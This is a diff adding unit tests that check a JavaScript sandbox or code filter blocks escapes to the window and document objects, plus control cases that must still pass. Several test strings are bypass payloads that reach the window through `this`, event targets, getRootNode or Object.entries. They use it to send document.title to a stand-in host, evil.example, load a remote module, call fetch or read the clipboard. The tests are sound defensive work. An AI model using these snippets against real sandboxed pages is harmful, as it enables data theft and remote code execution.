@@ -492,3 +492,130 @@ describe('audit of 00cc5f7 (#48): logical assignment', () => {
     expect(blocks(`const el = document.body; let n = 1; n ||= 2; el.style.setProperty('--n', n)`)).toBe(false)
   })
 })
+
+describe('audit of 00cc5f7 (#48): routes to the window and document values', () => {
+  const SNIPPETS = [
+    `setTimeout(function () { const w = this; const o = w.open; o.call(w, 'https://evil.example/?' + document.title) }, 0)`,
+    `window.addEventListener('focus', (e) => { const w = e.target; new w.FontFace('f', 'ur' + 'l(https://evil.example/?' + document.title + ')').load() })`,
+    `setTimeout(function () { new this.AudioContext().audioWorklet.addModule('https://evil.example/x.js') }, 0)`,
+    `setTimeout(function () { const f = Object.entries(this).find(([n]) => n === 'fe' + 'tch')[1]; f('https://evil.example') }, 0)`,
+    `window.addEventListener('focus', (e) => { e.target.navigator.clipboard.readText().then((t) => document.title = t) })`,
+    `const d = document.documentElement.parentNode; const { open } = d; open.call(d, 'https://evil.example/?' + document.title, '', '')`,
+    `const d = document.body.getRootNode(); const o = d.open; o.call(d, 'https://evil.example/', 'x', '')`,
+  ]
+  for (const snippet of SNIPPETS) {
+    it(`blocks: ${snippet}`, () => {
+      expect(blocks(snippet)).toBe(true)
+    })
+  }
+
+  it('blocks this in a function that is not a class or object method', () => {
+    for (const source of [
+      `setInterval(function tick() { const w = this }, 10)`,
+      `function f() { return this } setTimeout(f, 0)`,
+      `const f = function () { return this }; f()`,
+      `(function () { return this })()`,
+      `window.addEventListener('x', function () { this.open('https://evil.example') })`,
+      `const o = { handler: function () { return this } }`,
+      `class A { handler = function () { return this } }`,
+      `[1].forEach(function () { const w = this })`,
+    ]) {
+      expect(blocks(source), source).toBe(true)
+    }
+  })
+
+  it('blocks a method that can be handed to a window or document listener', () => {
+    // A listener function is called with this set to the object it is on, so
+    // a method passed there would receive the window.
+    expect(blocks(`const o = { f() { return this } }; window.addEventListener('x', o.f)`)).toBe(true)
+    expect(blocks(`class A { f() { return this } } document.addEventListener('x', new A().f)`)).toBe(true)
+    expect(blocks(`document.addEventListener('x', { handleEvent(e) { return e } })`)).toBe(true)
+    expect(blocks(`const h = () => 1; window.addEventListener('x', h)`)).toBe(true)
+  })
+
+  it('blocks every route from a window or document listener to its event target', () => {
+    for (const name of ['target', 'currentTarget', 'srcElement', 'originalTarget', 'explicitOriginalTarget', 'view']) {
+      expect(blocks(`document.addEventListener('x', (e) => { const t = e.${name}; })`), name).toBe(true)
+      expect(blocks(`window.addEventListener('x', function (e) { return e.${name} })`), name).toBe(true)
+    }
+    for (const source of [
+      `document.addEventListener('x', (e) => { const { target } = e })`,
+      `document.addEventListener('x', ({ target }) => target)`,
+      `document.addEventListener('x', (e) => { const f = e; f.target })`,
+      `document.addEventListener('x', (e) => { helper(e) }); function helper(ev) { return ev.key }`,
+      `document.addEventListener('x', (...args) => args[0])`,
+      `document.addEventListener('x', function () { return arguments[0] })`,
+      `window.addEventListener('x', (e) => { document.body.addEventListener('y', () => e.currentTarget) })`,
+      `window.addEventListener('x', (e) => e.composedPath())`,
+    ]) {
+      expect(blocks(source), source).toBe(true)
+    }
+  })
+
+  it('blocks getRootNode, and parentNode unless the result is used at once', () => {
+    for (const source of [
+      `document.body.getRootNode()`,
+      `document.body.getRootNode({ composed: true }).title`,
+      `const p = document.body.parentNode; p.title`,
+      `document.documentElement.parentNode.parentNode`,
+      `let n = document.body; while (n.parentNode) n = n.parentNode`,
+      `const { parentNode } = document.body`,
+      `document.createTreeWalker(document.body).parentNode()`,
+      `document.body.parentNode.open('https://evil.example')`,
+      `document.body.parentNode.defaultView`,
+      `document.getSelection().anchorNode`,
+    ]) {
+      expect(blocks(source), source).toBe(true)
+    }
+  })
+
+  it('blocks Object.entries, values, keys and getOwnPropertyNames on values that are not written out', () => {
+    for (const method of ['entries', 'values', 'keys', 'getOwnPropertyNames']) {
+      expect(blocks(`Object.${method}(document.body)`), method).toBe(true)
+      expect(blocks(`Object.${method}(document.body.dataset)`), method).toBe(true)
+      expect(blocks(`let o = { a: 1 }; o = document.body; Object.${method}(o)`), method).toBe(true)
+      expect(blocks(`Object.${method}({ ...document.body.dataset })`), method).toBe(true)
+      expect(blocks(`const f = Object.${method}; f({})`), method).toBe(true)
+      expect(blocks(`const O = Object; O.${method}({})`), method).toBe(true)
+      expect(blocks(`const { ${method} } = Object`), method).toBe(true)
+    }
+    // An alias of Object would also skip the Object.assign check.
+    expect(blocks(`const O = Object; O.assign(document.body, { src: 'x' })`)).toBe(true)
+  })
+
+  it('blocks reading or destructuring open, but not setting it', () => {
+    expect(blocks(`const d = document.querySelector('details'); const o = d.open`)).toBe(true)
+    expect(blocks(`const { open } = document.querySelector('details')`)).toBe(true)
+    expect(blocks(`const d = document.querySelector('details'); d.open = !d.open`)).toBe(true)
+    expect(blocks(`const d = document.querySelector('details'); d.open ||= true`)).toBe(true)
+    expect(blocks(`const d = document.querySelector('details'); [d.open] = [true]`)).toBe(true)
+  })
+
+  it('controls: the ordinary forms of the same code still pass', () => {
+    for (const source of [
+      `class A { n = 1; bump() { this.n++; return this.n } } new A().bump()`,
+      `class A { n = 1; static s = 2; static { this.s = 3 } } new A()`,
+      `const o = { n: 1, bump() { this.n++ }, get double() { return this.n * 2 } }; o.bump()`,
+      `class A { run() { setTimeout(() => { this.n = 1 }, 10) } } new A().run()`,
+      `window.addEventListener('resize', () => { document.body.dataset.w = String(window.innerWidth) })`,
+      `document.addEventListener('keydown', (e) => { if (e.key === 'j') e.preventDefault() })`,
+      `window.addEventListener('scroll', function (event) { return event.type })`,
+      `const b = document.createElement('button'); b.addEventListener('click', (e) => e.target.closest('a'))`,
+      `const b = document.body; b.addEventListener('click', function (e) { return e.currentTarget.id })`,
+      `const el = document.body.firstElementChild; el.parentNode.removeChild(el)`,
+      `const el = document.body.firstElementChild; el.parentNode.insertBefore(document.createElement('div'), el)`,
+      `const el = document.body.firstElementChild; el.parentNode.appendChild(el)`,
+      `const el = document.body.firstElementChild; const p = el.parentElement; p.classList.add('x')`,
+      `const e = Object.entries({ a: 1, b: 2 }); e.length`,
+      `const colours = { a: 'red', b: 'blue' }; Object.keys(colours).length; Object.values(colours)`,
+      `const keys = Object.getOwnPropertyNames(['x']); keys.length`,
+      `const o = Object.assign({}, { a: 1 }); o instanceof Object; Object(1); new Object()`,
+      `const m = new Map([['a', 1]]); for (const k of m.keys()) k; for (const v of m.values()) v; m.entries()`,
+      `const d = document.querySelector('details'); if (d) d.open = true`,
+      `const d = document.querySelector('details'); if (d) d.setAttribute('open', '')`,
+      `document.querySelectorAll('details:not([open])').forEach((d) => d.toggleAttribute('data-wa'))`,
+    ]) {
+      expect(blocks(source), source).toBe(false)
+    }
+  })
+})
